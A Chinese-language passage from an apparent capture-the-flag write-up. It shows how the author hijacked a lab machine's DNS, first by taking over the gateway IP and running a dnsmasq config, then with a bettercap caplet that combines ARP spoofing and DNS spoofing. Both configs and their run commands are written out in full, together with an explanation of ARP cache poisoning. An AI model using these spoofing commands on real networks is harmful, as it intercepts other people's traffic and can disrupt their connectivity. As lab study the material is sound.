我的思路是让我的kali抢占这个ip，然后开一个dns解析，把这个域名解析成自己

```bash
cat > /tmp/re-dnsmasq.conf << 'EOF'
interface=eth0
listen-address=192.168.39.206
bind-interfaces
no-resolv
address=/dev.warning.dsz/192.168.39.206
EOF

sudo dnsmasq --no-daemon --conf-file=/tmp/re-dnsmasq.conf
```

复盘

我比较好奇的是为什么靶机的DNS服务器IP的网段会在这个我桥接网卡的网段上，这个是怎么设置的，为什么有206这个设备，为什么我能抢占这个ip

![image-20260324160121788](/assets/img/posts/re/image-20260324160121788.png)

看了一下发现是 dhclient 分配的，那也很奇怪啊，这个IP是怎么来的呢。后面看了半天，原来这个IP是我桥接网卡的网关

![image-20260324164841841](/assets/img/posts/re/image-20260324164841841.png)

让ai解释了一下

- `/etc/resolv.conf` 中的 `nameserver 192.168.39.206` 并不是靶机导入时随机生成的，也不是题目作者手工写死的。结合系统内 `dhclient` 进程可以判断，该文件是靶机在桥接模式下联网后由 DHCP 自动生成的。由于 VirtualBox 使用的是桥接网卡，靶机会像真实主机一样直接接入当前物理网络，并从所在网段的 DHCP 服务器获取 IP、网关和 DNS 信息；而我宿主机 WLAN 的默认网关正是 `192.168.39.206`，因此靶机由 `dhclient-script` 把这个IP作为 `domain-name-servers` 写入了 `/etc/resolv.conf`。

为什么我能抢占呢

- 把 Kali 设成静态 `192.168.39.206` 以后，并不是“合法继承”了这个 IP，而是和原来的真实网关 `.206` 同时声明“我就是 192.168.39.206”。在同一个局域网里，主机发包前要先做 ARP，把“IP → MAC”的对应关系记到缓存里；谁先回应、谁最后发了 Gratuitous ARP，其他机器就可能暂时把 `.206` 记成谁的 MAC。于是那一小段时间里，发给 `.206` 的流量就会跑到你的 Kali。



后面看了群主的复盘，发现用 bettercap 劫持优雅多了，毕竟kali暴力抢占网关IP，很可能导致大家都上不了网。注意不能有注释，我只是在这里标记一下

```bash
cat > re-dns.cap << 'EOF'
set arp.spoof.targets 192.168.39.21		#靶机ip
set arp.spoof.fullduplex true

set dns.spoof.all false
set dns.spoof.domains dev.warning.dsz	#劫持的域名
set dns.spoof.address 192.168.39.142	#劫持的ip，指向kali

arp.spoof on
dns.spoof on
EOF

sudo bettercap -iface eth0 -caplet re-dns.cap
```
